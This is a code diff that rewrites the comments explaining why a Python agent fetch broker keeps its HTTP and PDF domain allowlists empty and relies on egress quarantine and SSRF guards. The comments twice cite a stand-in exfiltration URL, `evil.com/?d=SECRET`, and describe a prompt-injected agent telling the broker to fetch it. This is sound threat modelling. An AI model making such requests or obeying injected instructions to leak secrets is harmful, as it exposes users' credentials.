@@ -13,11 +13,12 @@ class AllowlistViolation(Exception):
 #
 # Rationale (same as PDF_ALLOWLIST below): response bodies flow to a runner
 # with no outbound egress, so they cannot be exfiltrated. URL-based side
-# channels (`evil.com/?d=SECRET`) are already possible via WebFetch today,
-# so restricting domains would not close any new risk class. Running agents
-# need to reach municipal platforms on arbitrary `.com` domains (Municode,
-# PrimeGov, eSCRIBE, CivicPlus, Granicus, BoardDocs, Azure blob packets),
-# and whitelisting each was a whack-a-mole blocker.
+# channels (`evil.com/?d=SECRET`) cannot be closed by a domain allowlist
+# either — running agents must reach municipal platforms on arbitrary `.com`
+# domains (Municode, PrimeGov, eSCRIBE, CivicPlus, Granicus, BoardDocs, Azure
+# blob packets), and whitelisting each was a whack-a-mole blocker. The
+# containment story relies on the runner's egress quarantine (no NAT, no
+# IAM credentials, broker as sole egress), not on URL filtering at this layer.
 #
 # SSRF into private / loopback / metadata IPs is still blocked by
 # http_fetch._validate_url (ported from pdf_fetch).
@@ -28,8 +29,9 @@ HTTP_ALLOWLIST: tuple[str, ...] = ()
 #
 # Rationale: PDF binary responses flow to a runner with no egress, so the
 # response cannot be exfiltrated. URL-based side channels (an injected agent
-# telling broker to fetch `evil.com/?d=SECRET`) are already possible today
-# via WebFetch, so restricting PDF domains would not close any new risk class.
+# telling broker to fetch `evil.com/?d=SECRET`) cannot be closed by a domain
+# allowlist — they require the same egress-quarantine containment as
+# HTTP_ALLOWLIST above.
 # The SSRF guards in pdf_fetch._validate_url (block RFC1918, link-local,
 # metadata, loopback) still apply.
 PDF_ALLOWLIST: tuple[str, ...] = ()
